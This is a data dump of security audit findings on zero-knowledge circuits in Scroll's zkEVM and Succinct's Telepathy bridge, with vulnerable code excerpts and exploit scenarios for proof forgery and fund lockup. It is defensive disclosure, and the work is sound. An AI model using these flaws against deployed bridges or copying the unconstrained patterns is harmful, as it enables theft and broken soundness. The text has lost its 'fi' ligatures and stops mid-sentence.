        "body": "Poseidon hashing is performed within the MPT circuit by performing lookups into a Poseidon table via the PoseidonLookup trait, shown in gure 1.1. /// Lookup represent the poseidon table in zkevm circuit pub trait PoseidonLookup { fn lookup_columns(&self) -> (FixedColumn, [AdviceColumn; 5]) { let (fixed, adv) = self.lookup_columns_generic(); (FixedColumn(fixed), adv.map(AdviceColumn)) } fn lookup_columns_generic(&self) -> (Column<Fixed>, [Column<Advice>; 5]) { let (fixed, adv) = self.lookup_columns(); (fixed.0, adv.map(|col| col.0)) } } Figure 1.1: src/gadgets/poseidon.rs#1121 This trait is not implemented by any types except the testing-only PoseidonTable shown in gure 1.2, which does not constrain its columns at all. #[cfg(test)] #[derive(Clone, Copy)] pub struct PoseidonTable { q_enable: FixedColumn, left: AdviceColumn, right: AdviceColumn, hash: AdviceColumn, control: AdviceColumn, head_mark: AdviceColumn, } #[cfg(test)] impl PoseidonTable { pub fn configure<F: FieldExt>(cs: &mut ConstraintSystem<F>) -> Self { let [hash, left, right, control, head_mark] = [0; 5].map(|_| AdviceColumn(cs.advice_column())); Self { left, right, hash, control, head_mark, q_enable: FixedColumn(cs.fixed_column()), } } Figure 1.2: src/gadgets/poseidon.rs#5680 The rest of the codebase treats this trait as a black-box implementation, so this does not seem to cause correctness problems elsewhere. However, it does limit ones ability to test some negative cases, and it makes the test coverage rely on the correctness of the PoseidonTable structs witness generation. Recommendations Short term, create a concrete implementation of the PoseidonLookup trait to enable full testing of the MPT circuit. Long term, ensure that all parts of the MPT circuit are tested with both positive and negative tests.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "2. IsZeroGadget does not constrain the inverse witness when the value is zero ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The IsZeroGadget implementation allows for an arbitrary inverse_or_zero witness value when the value parameter is 0. The gadget returns 1 when value is 0; otherwise, it returns 0. The implementation relies on the existence of an inverse for when value is nonzero and on correctly constraining that value * (1 - value * inverse_or_zero) == 0. However, when value is 0, the constraint is immediately satised, regardless of the value of the inverse_or_zero witness. This allows an arbitrary value to be provided for that witness value. pub fn configure<F: FieldExt>( cs: &mut ConstraintSystem<F>, cb: &mut ConstraintBuilder<F>, value: AdviceColumn, // TODO: make this a query once Query is clonable/copyable..... ) -> Self { let inverse_or_zero = AdviceColumn(cs.advice_column()); cb.assert_zero( \"value is 0 or inverse_or_zero is inverse of value\", value.current() * (Query::one() - value.current() * inverse_or_zero.current()), ); Self { value, inverse_or_zero, } } Figure 2.1: mpt-circuit/src/gadgets/is_zero.rs#4862 Recommendations Short term, ensure that the circuit is deterministic by constraining inverse_or_zero to equal 0 when value is 0. Long term, document which circuits have nondeterministic witnesses; over time, constrain them so that all circuits have deterministic witnesses.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. The MPT nonexistence proof gadget is missing constraints specied in the documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The gadget for checking the consistency of nonexistence proofs is missing several constraints related to type 2 nonexistence proofs. The circuit specication includes constraints for the nonexistence of path proofs that are not included in the implementation. This causes the witness values to be unconstrained in some cases. For example, the following constraints are specied:  other_key_hash should equal 0 when key does not equal other_key.  other_leaf_data_hash should equal the hash of the empty node (pointer by other_key). Neither of these constraints is enforced in the implementation: this is because the implementation has no explicit constraints imposed for the type 2 nonexistence proofs. Figure 3.1 shows that the circuit constrains these values only for type 1 proofs. pub fn configure<F: FieldExt>( cb: &mut ConstraintBuilder<F>, value: SecondPhaseAdviceColumn, key: AdviceColumn, other_key: AdviceColumn, key_equals_other_key: IsZeroGadget, hash: AdviceColumn, hash_is_zero: IsZeroGadget, other_key_hash: AdviceColumn, other_leaf_data_hash: AdviceColumn, poseidon: &impl PoseidonLookup, ) { cb.assert_zero(\"value is 0 for empty node\", value.current()); cb.assert_equal( \"key_minus_other_key = key - other key\", key_equals_other_key.value.current(), key.current() - other_key.current(), ); cb.assert_equal( \"hash_is_zero input == hash\", hash_is_zero.value.current(), hash.current(), ); let is_type_1 = !key_equals_other_key.current(); let is_type_2 = hash_is_zero.current(); cb.assert_equal( \"Empty account is either type 1 xor type 2\", Query::one(), Query::from(is_type_1.clone()) + Query::from(is_type_2), ); cb.condition(is_type_1, |cb| { cb.poseidon_lookup( \"other_key_hash == h(1, other_key)\", [Query::one(), other_key.current(), other_key_hash.current()], poseidon, ); cb.poseidon_lookup( \"hash == h(key_hash, other_leaf_data_hash)\", [ other_key_hash.current(), other_leaf_data_hash.current(), hash.current(), ], poseidon, ); }); Figure 3.1: mpt-circuit/src/gadgets/mpt_update/nonexistence_proof.rs#754 The Scroll team has stated that this is a specication error and that the missing constraints do not impact the soundness of the circuit. Recommendations Short term, update the specication to remove the description of these constraints; ensure that the documentation is kept updated. Long term, add positive and negative tests for both types of nonexistence proofs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. Discrepancies between the MPT circuit specication and implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The MPT circuit implementation is not faithful to the circuit specication in many areas and does not contain comments for the constraints that are either missing from the implementation or that diverge from those in the specication. The allowed segment transitions depend on the proof type. For the NonceChanged proof type, the specication states that the Start segment type can transition to Start and that the AccountLeaf0 segment type also can transition to Start. However, neither of these paths is allowed in the implementation. MPTProofType::NonceChanged | MPTProofType::BalanceChanged | MPTProofType::CodeSizeExists | MPTProofType::CodeHashExists => [ SegmentType::Start, vec![ SegmentType::AccountTrie, // mpt has > 1 account SegmentType::AccountLeaf0, // mpt has <= 1 account ], ( ), ( SegmentType::AccountTrie, vec![ SegmentType::AccountTrie, SegmentType::AccountLeaf0, SegmentType::Start, // empty account proof ], ), (SegmentType::AccountLeaf0, vec![SegmentType::AccountLeaf1]), (SegmentType::AccountLeaf1, vec![SegmentType::AccountLeaf2]), (SegmentType::AccountLeaf2, vec![SegmentType::AccountLeaf3]), (SegmentType::AccountLeaf3, vec![SegmentType::Start]), Figure 4.1: mpt-circuit/src/gadgets/mpt_update/segment.rs#20 Figure 4.2: Part of the MPT specication (spec/mpt-proof.md#L318-L328) The transitions allowed for the PoseidonCodeHashExists proof type also do not match: the specication states that it has the same transitions as the NonceChanged proof type, but the implementation has dierent transitions. The key depth direction checks also do not match the specication. The specication states that the depth parameter should be used but the implementation uses depth - 1. cb.condition(is_trie.clone(), |cb| { cb.add_lookup( \"direction is correct for key and depth\", [key.current(), depth.current() - 1, direction.current()], key_bit.lookup(), ); cb.assert_equal( \"depth increases by 1 in trie segments\", depth.current(), depth.previous() + 1, ); cb.condition(path_type.current_matches(&[PathType::Common]), |cb| { cb.add_lookup( \"direction is correct for other_key and depth\", [ other_key.current(), depth.current() - 1, Figure 4.3: mpt-circuit/src/gadgets/mpt_update.rs#188 Figure 4.4: Part of the MPT specication (spec/mpt-proof.md#L279-L282) Finally, the specication states that when a segment type is a non-trie type, the value of key should be constrained to 0, but this constraint is omitted from the implementation. cb.condition(!is_trie, |cb| { cb.assert_zero(\"depth is 0 in non-trie segments\", depth.current()); }); Figure 4.5: mpt-circuit/src/gadgets/mpt_update.rs#212214 Figure 4.6: Part of the MPT specication (spec/mpt-proof.md#L284-L286) Recommendations Short term, review the specication and ensure its consistency. Match the implementation with the specication, and document possible optimizations that remove constraints, detailing why they do not cause soundness issues. Long term, include both positive and negative tests for all edge cases in the specication.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "5. Redundant lookups in the Word RLC circuit ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The Word RLC circuit has two redundant lookups into the BytesLookup table. The Word RLC circuit combines the random linear combination (RLC) for the lower and upper 16 bytes of a word into a single RLC value. For this, it checks that the lower and upper word segments are 16 bytes by looking into the BytesLookup table, and it checks that their RLCs are correctly computed by looking into the RlcLookup table. However, the lookup into the RlcLookup table will also ensure that the lower and upper segments of the word have the correct 16 bytes, making the rst two lookups redundant. pub fn configure<F: FieldExt>( cb: &mut ConstraintBuilder<F>, [word_hash, high, low]: [AdviceColumn; 3], [rlc_word, rlc_high, rlc_low]: [SecondPhaseAdviceColumn; 3], poseidon: &impl PoseidonLookup, bytes: &impl BytesLookup, rlc: &impl RlcLookup, randomness: Query<F>, ) { cb.add_lookup( \"old_high is 16 bytes\", [high.current(), Query::from(15)], bytes.lookup(), ); cb.add_lookup( \"old_low is 16 bytes\", [low.current(), Query::from(15)], bytes.lookup(), ); cb.poseidon_lookup( \"word_hash = poseidon(high, low)\", [high.current(), low.current(), word_hash.current()], poseidon, ); cb.add_lookup( \"rlc_high = rlc(high) and high is 16 bytes\", [high.current(), Query::from(15), rlc_high.current()], rlc.lookup(), ); cb.add_lookup( \"rlc_low = rlc(low) and low is 16 bytes\", [low.current(), Query::from(15), rlc_low.current()], rlc.lookup(), Figure 5.1: mpt-circuit/src/gadgets/mpt_update/word_rlc.rs#1649 Although the WordRLC::configure function receives two dierent lookup objects, bytes and rlc, they are instantiated with the same concrete lookup: let mpt_update = MptUpdateConfig::configure( cs, &mut cb, poseidon, &key_bit, &byte_representation, &byte_representation, &rlc_randomness, &canonical_representation, ); Figure 5.2: mpt-circuit/src/mpt.rs#6069 We also note that the labels refer to the upper and lower bytes as old_high and old_low instead of just high and low. Recommendations Short term, determine whether both the BytesLookup and RlcLookup tables are needed for this circuit, and refactor the circuit accordingly, removing the redundant constraints. Long term, review the codebase for duplicated or redundant constraints using manual and automated methods.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. The NonceChanged conguration circuit does not constrain the new value nonce value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The NonceChanged conguration circuit does not constrain the config.new_value parameter to be 8 bytes. Instead, there is a duplicated constraint for config.old_value: SegmentType::AccountLeaf3 => { cb.assert_zero(\"direction is 0\", config.direction.current()); let old_code_size = (config.old_hash.current() - config.old_value.current()) * Query::Constant(F::from(1 << 32).square().invert().unwrap()); let new_code_size = (config.new_hash.current() - config.new_value.current()) * Query::Constant(F::from(1 << 32).square().invert().unwrap()); cb.condition( config.path_type.current_matches(&[PathType::Common]), |cb| { cb.add_lookup( \"old nonce is 8 bytes\", [config.old_value.current(), Query::from(7)], bytes.lookup(), ); cb.add_lookup( \"new nonce is 8 bytes\", [config.old_value.current(), Query::from(7)], bytes.lookup(), ); Figure 6.1: mpt-circuit/src/gadgets/mpt_update.rs#12091228 This means that a malicious prover could update the Account node with a value of arbitrary length for the Nonce and Codesize parameters. The same constraint (with a correct label but incorrect value) is used in the ExtensionNew path type: cb.condition( config.path_type.current_matches(&[PathType::ExtensionNew]), |cb| { cb.add_lookup( \"new nonce is 8 bytes\", [config.old_value.current(), Query::from(7)], bytes.lookup(), ); Figure 6.2: mpt-circuit/src/gadgets/mpt_update.rs#12411248 Exploit Scenario A malicious prover uses the NonceChanged proof to update the nonce with a larger than expected value. Recommendations Short term, enforce the constraint for the config.new_value witness. Long term, add positive and negative testing of the edge cases present in the specication. For both the Common and ExtensionNew path types, there should be a negative test that fails because it changes the new nonce to a value larger than 8 bytes. Use automated testing tools like Semgrep to nd redundant and duplicate constraints, as these could indicate that a constraint is incorrect.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. The Copy circuit does not totally enforce the tag values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The Copy table includes a tag column that indicates the type of data for that particular row. However, the Copy circuit tag validation function does not totally ensure that the tag matches one of the predened tag values. The implementation uses the copy_gadgets::constrain_tag function to bind the is_precompiled, is_tx_calldata, is_bytecode, is_memory, and is_tx_log witnesses to the actual tag value. However, the code does not ensure that exactly one of these Boolean values is true. #[allow(clippy::too_many_arguments)] pub fn constrain_tag<F: Field>( meta: &mut ConstraintSystem<F>, q_enable: Column<Fixed>, tag: BinaryNumberConfig<CopyDataType, 4>, is_precompiled: Column<Advice>, is_tx_calldata: Column<Advice>, is_bytecode: Column<Advice>, is_memory: Column<Advice>, is_tx_log: Column<Advice>, ) { meta.create_gate(\"decode tag\", |meta| { let enabled = meta.query_fixed(q_enable, CURRENT); let is_precompile = meta.query_advice(is_precompiled, CURRENT); let is_tx_calldata = meta.query_advice(is_tx_calldata, CURRENT); let is_bytecode = meta.query_advice(is_bytecode, CURRENT); let is_memory = meta.query_advice(is_memory, CURRENT); let is_tx_log = meta.query_advice(is_tx_log, CURRENT); let precompiles = sum::expr([ tag.value_equals( CopyDataType::Precompile(PrecompileCalls::Ecrecover), CURRENT, )(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Sha256), CURRENT)(meta), tag.value_equals( CopyDataType::Precompile(PrecompileCalls::Ripemd160), CURRENT, )(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Identity), CURRENT)(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Modexp), CURRENT)(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Bn128Add), CURRENT)(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Bn128Mul), CURRENT)(meta), tag.value_equals( CopyDataType::Precompile(PrecompileCalls::Bn128Pairing), CURRENT, )(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Blake2F), CURRENT)(meta), ]); vec![ // Match boolean indicators to their respective tag values. enabled.expr() * (is_precompile - precompiles), enabled.expr() * (is_tx_calldata - tag.value_equals(CopyDataType::TxCalldata, CURRENT)(meta)), enabled.expr() CURRENT)(meta)), * (is_bytecode - tag.value_equals(CopyDataType::Bytecode, enabled.expr() * (is_memory - tag.value_equals(CopyDataType::Memory, CURRENT)(meta)), enabled.expr() * (is_tx_log - tag.value_equals(CopyDataType::TxLog, CURRENT)(meta)), ] }); } Figure 7.1: copy_circuit/copy_gadgets.rs#1362 In fact, the tag value could equal CopyDataType::RlcAcc, as in the SHA3 gadget. The CopyDataType::Padding value is also not currently matched. In the current state of the codebase, this issue does not appear to cause any soundness issues because the lookups into the Copy table either use a statically set source and destination tag or, as in the case of precompiles, the value is correctly bounded and does not pose an avenue of attack for a malicious prover. We also observe that the Copy circuit specication mentions a witness value for the is_rlc_acc case, but this is not reected in the code. Recommendations Short term, ensure that the tag column is fully constrained. Review the circuit specication and match the implementation with the specication, documenting possible optimizations that remove constraints and detailing why they do not cause soundness issues. Long term, include negative tests for an unintended tag value.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "8. The invalid creation error handling circuit is unconstrained ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The invalid creation error handling circuit does not constrain the rst byte of the actual memory to be 0xef as intended. This allows a malicious prover to redirect the EVM execution to a halt after the CREATE opcode is called, regardless of the memory value. The ErrorInvalidCreationCodeGadget circuit was updated to accommodate the memory addressing optimizations. However, in doing so, the first_byte witness value that was bound to the memorys rst byte is no longer bound to it. Therefore, a malicious prover can always satisfy the circuit constraints, even if they are not in an error state after the CREATE opcode is called. fn configure(cb: &mut EVMConstraintBuilder<F>) -> Self { let opcode = cb.query_cell(); let first_byte = cb.query_cell(); //let address = cb.query_word_rlc(); let offset = cb.query_word_rlc(); let length = cb.query_word_rlc(); let value_left = cb.query_word_rlc(); cb.stack_pop(offset.expr()); cb.stack_pop(length.expr()); cb.require_true(\"is_create is true\", cb.curr.state.is_create.expr()); let address_word = MemoryWordAddress::construct(cb, offset.clone()); // lookup memory for first word cb.memory_lookup( 0.expr(), address_word.addr_left(), value_left.expr(), value_left.expr(), None, ); // let first_byte = value_left.cells[address_word.shift()]; // constrain first byte is 0xef let is_first_byte_invalid = IsEqualGadget::construct(cb, first_byte.expr(), 0xef.expr()); cb.require_true( \"is_first_byte_invalid is true\", is_first_byte_invalid.expr(), ); Figure 8.1: evm_circuit/execution/error_invalid_creation_code.rs#3667 Exploit Scenario A malicious prover generates two dierent proofs for the same transaction, one leading to the error state, and the other successfully executing the CREATE opcode. Distributing these proofs to two ends of a bridge leads to state divergence and a loss of funds. Recommendations Short term, bind the first_byte witness value to the memory value; ensure that the successful CREATE end state checks that the rst byte is dierent from 0xef. Long term, investigate ways to generate malicious traces that could be added to the test suite; every time a new soundness issue is found, create such a malicious trace and add it to the test suite.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. The OneHot primitive allows more than one value at once ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The OneHot primitive uses BinaryQuery values as witness values. However, despite their name, these values are not constrained to be Boolean values, allowing a malicious prover to choose more than one hot value in the data structure. impl<T: IntoEnumIterator + Hash + Eq> OneHot<T> { pub fn configure<F: FieldExt>( cs: &mut ConstraintSystem<F>, cb: &mut ConstraintBuilder<F>, ) -> Self { let mut columns = HashMap::new(); for variant in Self::nonfirst_variants() { columns.insert(variant, cb.binary_columns::<1>(cs)[0]); } let config = Self { columns }; cb.assert( \"sum of binary columns in OneHot is 0 or 1\", config.sum(0).or(!config.sum(0)), ); config } Figure 9.1: mpt-circuit/src/gadgets/one_hot.rs#1430 The reason the BinaryQuery values are not constrained to be Boolean is because the BinaryColumn conguration does not constrain the advice values to be Boolean, and the conguration is simply a type wrapper around the Column<Advice> type. This provides no guarantees to the users of this API, who might assume that these values are guaranteed to be Boolean. pub fn configure<F: FieldExt>( cs: &mut ConstraintSystem<F>, _cb: &mut ConstraintBuilder<F>, ) -> Self { let advice_column = cs.advice_column(); // TODO: constrain to be binary here... // cb.add_constraint() Self(advice_column) } Figure 9.2: mpt-circuit/src/constraint_builder/binary_column.rs#2937 The OneHot primitive is used to implement the Merkle pathchecking state machine, including critical properties such as requiring the key and other_key columns to remain unchanged along a given Merkle path calculation, as shown in gure 9.3. cb.condition( !segment_type.current_matches(&[SegmentType::Start, SegmentType::AccountLeaf3]), |cb| { cb.assert_equal( \"key can only change on Start or AccountLeaf3 rows\", key.current(), key.previous(), ); cb.assert_equal( \"other_key can only change on Start or AccountLeaf3 rows\", other_key.current(), other_key.previous(), ); }, ); Figure 9.3: mpt-circuit/src/gadgets/mpt_update.rs#170184 We did not develop a proof-of-concept exploit for the path-checking table, so it may be the case that the constraint in gure 9.3 is not exploitable due to other constraints. However, if at any point it is possible to match both SegmentType::Start and some other segment type (such as by setting one OneHot cell to 1 and another to -1), a malicious prover would be able to change the key partway through and forge Merkle updates. Exploit Scenario A malicious prover uses the OneHot soundness issue to bypass constraints, ensuring that the key and other_key columns remain unchanged along a given Merkle path calculation. This allows the attacker to successfully forge MPT update proofs that update an arbitrary key. Recommendations Short term, add constraints that ensure that the advice values from these columns are Boolean. Long term, add positive and negative tests ensuring that these constraint builders operate according to their expectations.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Intermediate columns are not explicit ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
        "body": "The MPT update circuit includes two arrays of intermediate value columns, as shown in gure 10.1. intermediate_values: [AdviceColumn; 10], // can be 4? second_phase_intermediate_values: [SecondPhaseAdviceColumn; 10], // 4? Figure 10.1: mpt-circuit/src/gadgets/mpt_update.rs#6566 These columns are used as general-use cells for values that are only conditionally needed in a given row, reducing the total number of columns needed. For example, gure 10.2 shows that intermediate_values[0] is used for the address value in rows that match SegmentType::Start, but as shown in gure 10.3, rows representing the SegmentType::AccountLeaf3 state of a Keccak code-hash proof use that same slot for the old_high value. let address = self.intermediate_values[0].current() * is_start(); Figure 10.2: mpt-circuit/src/gadgets/mpt_update.rs#78 SegmentType::AccountLeaf3 => { cb.assert_equal(\"direction is 1\", config.direction.current(), Query::one()); let [old_high, old_low, new_high, new_low, ..] = config.intermediate_values; Figure 10.3: mpt-circuit/src/gadgets/mpt_update.rs#16321635 In some cases, cells of intermediate_values are used starting from the end of the intermediate_values column, such as the other_key_hash and other_leaf_data_hash values in PathType::ExtensionOld rows, as illustrated in gure 10.4. let [.., key_equals_other_key, new_hash_is_zero] = config.is_zero_gadgets; let [.., other_key_hash, other_leaf_data_hash] = config.intermediate_values; nonexistence_proof::configure( cb, config.new_value, config.key, config.other_key, key_equals_other_key, config.new_hash, new_hash_is_zero, other_key_hash, other_leaf_data_hash, poseidon, ); Figure 10.4: mpt-circuit/src/gadgets/mpt_update.rs#10361049 Although we did not nd any mistakes such as misused columns, this pattern is ad hoc and error-prone, and evaluating the correctness of this pattern requires checking every individual use of intermediate_values. Recommendations Short term, document the assignment of all intermediate_values columns in each relevant case. Long term, consider using Rust types to express the dierent uses of the various intermediate_values columns. For example, one could dene an IntermediateValues enum, with cases like StartRow { address: &AdviceColumn } and ExtensionOld { other_key_hash: &AdviceColumn, other_leaf_data_hash: &AdviceColumn }, and a single function fn parse_intermediate_values(segment_type: SegmentType, path_type: PathType, columns: &[AdviceColumn; 10]) -> IntermediateValues. Then, the correct assignment and use of intermediate_values columns can be audited only by checking parse_intermediate_values. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Prover can lock user funds by including ill-formed BigInts in public key commitment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The Rotate circuit does not check for the validity of BigInts included in pubkeysBigIntY . A malicious prover can lock user funds by carefully selecting malformed public keys and using the Rotate function, which will prevent future provers from using the default witness generator to make new proofs. The Rotate circuit is designed to prove a translation between an SSZ commitment over a set of validator public keys produced by the Ethereum consensus protocol and a Poseidon commitment over an equivalent list. The SSZ commitment is over public keys serialized as 48-byte compressed BLS public keys, specifying an X coordinate and single sign bit, while the Poseidon commitment is over pairs (X, Y) , where X and Y are 7-limb, 55-bit BigInts. The prover species the Y coordinate for each public key as part of the witness; the Rotate circuit then uses SubgroupCheckG1WithValidX to constrain Y to be valid in the sense that (X, Y) is a point on the BLS12-381 elliptic curve. However, SubgroupCheckG1WithValidX assumes that its input is a properly formed BigInt, with all limbs less than 2 55 . This property is not validated anywhere in the Rotate circuit. By committing to a Poseidon root containing invalid BigInts, a malicious prover can prevent other provers from successfully proving a Step operation, bringing the light client to a halt and causing user funds to be stuck in the bridge. Furthermore, the invalid elliptic curve points would then be usable in the Step circuit, where they are passed without validation to the EllipticCurveAddUnequal function. The behavior of this function on ill-formed inputs is not specied and could allow a malicious prover to forge Step proofs without a valid sync committee signature. Figure 1.1 shows where the untrusted pubkeysBigIntY value is passed to the SubgroupCheckG1WithValidX template. /* VERIFY THAT THE WITNESSED Y-COORDINATES MAKE THE PUBKEYS LAY ON THE CURVE */ component isValidPoint[SYNC_COMMITTEE_SIZE]; for ( var i = 0 ; i < SYNC_COMMITTEE_SIZE; i++) { isValidPoint[i] = SubgroupCheckG1WithValidX(N, K); for ( var j = 0 ; j < K; j++) { isValidPoint[i]. in [ 0 ][j] <== pubkeysBigIntX[i][j]; isValidPoint[i]. in [ 1 ][j] <== pubkeysBigIntY[i][j]; } } Figure 1.1: telepathy/circuits/circuits/rotate.circom#101109 Exploit Scenario Alice, a malicious prover, uses a valid block header containing a sync committee update to generate a Rotate proof. Instead of using correctly formatted BigInts to represent the Y values of each public key point, she modies the value by subtracting one from the most signicant limb and adding 2 55 to the second-most signicant limb. She then posts the resulting proof to the LightClient contract via the rotate function, which updates the sync committee commitment to Alices Poseidon commitment containing ill-formed Y coordinates. Future provers would then be unable to use the default witness generator to make new proofs, locking user funds in the bridge. Alice may be able to then exploit invalid assumptions in the Step circuit to forge Step proofs and steal bridge funds. Recommendations Short term, use a Num2Bits component to verify that each limb of the pubkeysBigIntY witness value is less than 2 55 . Long term, clearly document and validate the input assumptions of templates such as SubgroupCheckG1WithValidX . Consider adopting Circom signal tags to automate the checking of these assumptions.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Prover can lock user funds by supplying non-reduced Y values to G1BigIntToSignFlag ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The G1BigIntToSignFlag template does not check whether its input is a value properly reduced mod p . A malicious prover can lock user funds by carefully selecting malformed public keys and using the Rotate function, which will prevent future provers from using the default witness generator to make new proofs. During the Rotate proof, when translating compressed public keys to full (X, Y) form, the prover must supply a Y value with a sign corresponding to the sign bit of the compressed public key. The circuit calculates the sign of Y by passing the Y coordinate (supplied by the prover and represented as a BigInt) to the G1BigIntToSignFlag component (gure 2.1). This component determines the sign of Y by checking if 2*Y >= p . However, the correctness of this calculation depends on the Y value being less than p ; otherwise, a positive, non-reduced value such as p + 1 will be incorrectly interpreted as negative. A malicious prover could use this fact to commit to a non-reduced form of Y that diers in sign from the correct public key. This invalid commitment would prevent future provers from generating Step circuit proofs and thus halt the LightClient , trapping user funds in the Bridge . template G1BigIntToSignFlag(N, K) { signal input in [K]; signal output out; var P[K] = getBLS128381Prime(); var LOG_K = log_ceil(K); component mul = BigMult(N, K); signal two[K]; for ( var i = 0 ; i < K; i++) { if (i == 0 ) { two[i] <== 2 ; } else { two[i] <== 0 ; } } for ( var i = 0 ; i < K; i++) { mul.a[i] <== in [i]; mul.b[i] <== two[i]; } component lt = BigLessThan(N, K); for ( var i = 0 ; i < K; i++) { lt.a[i] <== mul.out[i]; lt.b[i] <== P[i]; } out <== 1 - lt.out; } Figure 2.1: telepathy/circuits/circuits/bls.circom#197226 Exploit Scenario Alice, a malicious prover, uses a valid block header containing a sync committee update to generate a Rotate proof. When one of the new sync committee members public key Y value has a negative sign, Alice substitutes it with 2P - Y . This value is congruent to -Y mod p , and thus has positive sign; however, the G1BigIntToSignFlag component will determine that it has negative sign and validate the inclusion in the Poseidon commitment. Future provers will then be unable to generate proofs from this commitment since the committed public key set does not match the canonical sync committee. Recommendations Short term, constrain the pubkeysBigIntY values to be less than p using BigLessThan . Long term, constrain all private witness values to be in canonical form before use. Consider adopting Circom signal tags to automate the checking of these assumptions.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Incorrect handling of point doubling can allow signature forgery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "When verifying the sync committee signature, individual public keys are aggregated into an overall public key by repeatedly calling G1Add in a tree structure. Due to the mishandling of elliptic curve point doublings, a minority of carefully selected public keys can cause the aggregation to result in an arbitrary, maliciously chosen public key, allowing signature forgeries and thus malicious light client updates. When bit1 and bit2 of G1Add are both set, G1Add computes out by calling EllipticCurveAddUnequal : template parallel G1Add(N, K) { var P[ 7 ] = getBLS128381Prime(); signal input pubkey1[ 2 ][K]; signal input pubkey2[ 2 ][K]; signal input bit1; signal input bit2; /* COMPUTE BLS ADDITION */ signal output out[ 2 ][K]; signal output out_bit; out_bit <== bit1 + bit2 - bit1 * bit2; component adder = EllipticCurveAddUnequal( 55 , 7 , P); for ( var i = 0 ; i < 2 ; i++) { for ( var j = 0 ; j < K; j++) { adder.a[i][j] <== pubkey1[i][j]; adder.b[i][j] <== pubkey2[i][j]; } } Figure 3.1: telepathy/circuits/circuits/bls.circom#82 The results of EllipticCurveAddUnequal are constrained by equations that reduce to 0 = 0 if a and b are equal: // constrain x_3 by CUBIC (x_1 + x_2 + x_3) * (x_2 - x_1)^2 - (y_2 - y_1)^2 = 0 mod p component dx_sq = BigMultShortLong(n, k, 2 *n+LOGK+ 2 ); // 2k-1 registers abs val < k*2^{2n} component dy_sq = BigMultShortLong(n, k, 2 *n+LOGK+ 2 ); // 2k-1 registers < k*2^{2n} for ( var i = 0 ; i < k; i++){ dx_sq.a[i] <== b[ 0 ][i] - a[ 0 ][i]; dx_sq.b[i] <== b[ 0 ][i] - a[ 0 ][i]; dy_sq.a[i] <== b[ 1 ][i] - a[ 1 ][i]; dy_sq.b[i] <== b[ 1 ][i] - a[ 1 ][i]; } [...] component cubic_mod = SignedCheckCarryModToZero(n, k, 4 *n + LOGK3, p); for ( var i= 0 ; i<k; i++) cubic_mod. in [i] <== cubic_red.out[i]; // END OF CONSTRAINING x3 // constrain y_3 by (y_1 + y_3) * (x_2 - x_1) = (y_2 - y_1)*(x_1 - x_3) mod p component y_constraint = PointOnLine(n, k, p); // 2k-1 registers in [0, k*2^{2n+1}) for ( var i = 0 ; i < k; i++) for ( var j= 0 ; j< 2 ; j++){ y_constraint. in [ 0 ][j][i] <== a[j][i]; y_constraint. in [ 1 ][j][i] <== b[j][i]; y_constraint. in [ 2 ][j][i] <== out[j][i]; } // END OF CONSTRAINING y3 Figure 3.2: telepathy/circuits/circuits/pairing/curve.circom#182221 If any inputs to G1Add are equal, a malicious prover can choose outputs to trigger this bug repeatedly and cause the signature to be checked with a public key of their choice. Each input to G1Add can be either a committee member public key or an intermediate aggregate key. Exploit Scenario Alice, a malicious prover, registers public keys A = aG , B = bG and C = (a+b)G . She waits for a sync committee selection in which A , B and C are all present and located in the same subtree of the sync committee 